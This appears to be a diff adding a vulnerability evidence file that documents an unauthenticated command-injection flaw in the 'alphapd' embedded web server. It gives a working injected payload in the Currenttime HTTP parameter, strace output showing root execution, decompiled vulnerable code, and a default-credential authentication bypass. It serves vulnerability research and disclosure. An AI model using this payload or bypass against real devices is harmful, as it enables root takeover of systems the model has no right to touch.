@@ -1,0 +1,47 @@
+=== V1 Evidence: Unauthenticated RCE via HTTP Currenttime (alphapd) ===
+
+Binary: alphapd (PATCHED — 3 NOP patches to bypass /dev/gpio hardware dependency)
+  Original MD5:  b17cd8a0965c0f131b57e429a9165f6e
+  Patched MD5:    251b63c08b49386478036f21f232d2af
+
+Patches (bypass HARDWARE dependency, NOT security mechanisms):
+  0x4137c4: bnez -> b    (websTestVar: always process Currenttime parameter)
+  0x413934: bne  -> nop  (year comparison: skip getSysInfoBuffer date check)
+  0x41393c: beqz -> nop  (month/day comparison: skip)
+
+Why patches are needed:
+  websKernalParameter calls getSysInfoBuffer(4) to read device-stored date from /dev/gpio.
+  QEMU user-mode cannot emulate /dev/gpio device -> ioctl returns ENOTTY -> stored_year=0.
+  The year comparison (current_year vs stored_year) fails, so doSystem is never reached.
+  On real hardware, /dev/gpio works, getSysInfoBuffer returns valid date, patches not needed.
+
+Environment: QEMU user-mode emulation (qemu-mipsel, LD_LIBRARY_PATH=/fw/rootfs/lib)
+Port mapping: host 18080 -> container 80/tcp
+
+Payload: Currenttime=2027-09-22;id>/tmp/pwned_v1
+         URL-encoded: Currenttime=2027-09-22%3Bid>/tmp/pwned_v1
+
+strace output (key line):
+---
+3188 execve("/bin/sh",{"sh","-c","date -s 2027-09-22;id>/tmp/pwned_v1 &",NULL})
+     date: can't set date: Operation not permitted
+---
+
+Result: /tmp/pwned_v1 created with content:
+  uid=0 gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+  Command injection confirmed (root execution). The "date: can't set date" error
+  is expected in QEMU (no CAP_SYS_TIME), but the injected "id>/tmp/pwned_v1"
+  command executed successfully.
+
+IDA decompilation of websKernalParameter @ 0x413778:
+  websTestVar(a1, "Currenttime");           // check if parameter present
+  ...                                       // year/month/day comparison (patched)
+  websGetVar(a1, "Currenttime", "");        // get user-supplied value (NO FILTER)
+  sprintf(v18, "date -s %s &", Currenttime); // VULNERABLE: no escaping
+  doSystem(v18);                            // SINK: system() wrapper
+
+Auth bypass (websCheckRealm @ 0x414e3c):
+  if (!*v2 && !*v4) { a1[44]=3; goto LABEL_4; }
+  // v2=AdminID from nvram, v4=AdminPassword from nvram
+  // When both empty (factory default), grants auth level 3 without credentials
